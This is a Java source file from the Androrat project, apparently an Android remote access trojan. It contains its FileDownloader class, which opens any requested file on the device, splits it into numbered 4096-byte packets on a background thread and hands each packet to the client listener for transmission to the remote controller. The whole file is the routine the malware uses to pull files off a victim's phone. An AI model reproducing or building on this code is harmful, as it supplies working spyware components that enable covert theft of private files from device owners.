/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package my.app.Library;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;

import my.app.activityclient.ClientListener;

import Packet.FilePacket;

public class FileDownloader {

	ClientListener ctx;
	byte[] finalData;
	InputStream in;
	File f;
	int channel;
	FilePacket packet;
	byte[] buffer;
	short numseq = 0;
	int BUFF_SIZE = 4096;
	
	public FileDownloader(ClientListener c) {
		ctx = c;
	}
	
	public boolean downloadFile(String s, int chan) {
		channel = chan;
		f = new File(s);
		try {
			in = new FileInputStream(f);
		} catch (FileNotFoundException e) {
			return false;
		}

        Thread loadf = new Thread(new Runnable() {
        	public void run() {
        		load();
        	}
        });
        loadf.start();
        
		return true;
	}
	
	public void load() {
		try {
			while(true) {
				buffer = new byte[BUFF_SIZE];
				int read = in.read(buffer);
				if (read == -1) {
					break;
				}
				if (read == BUFF_SIZE) {
					packet = new FilePacket(numseq, (byte) 1, buffer);
					ctx.handleData(channel, packet.build());
					numseq ++;
				}
				else {//C'était le dernier paquet
					byte[] tmp = new byte[read];
					System.arraycopy(buffer, 0, tmp, 0, read);
					packet = new FilePacket(numseq, (byte) 0, tmp);
					ctx.handleData(channel, packet.build());
					break;
				}
			}
			in.close();
		}
		catch(IOException e) {
			ctx.sendError("IOException loading file");
		}
	}
}
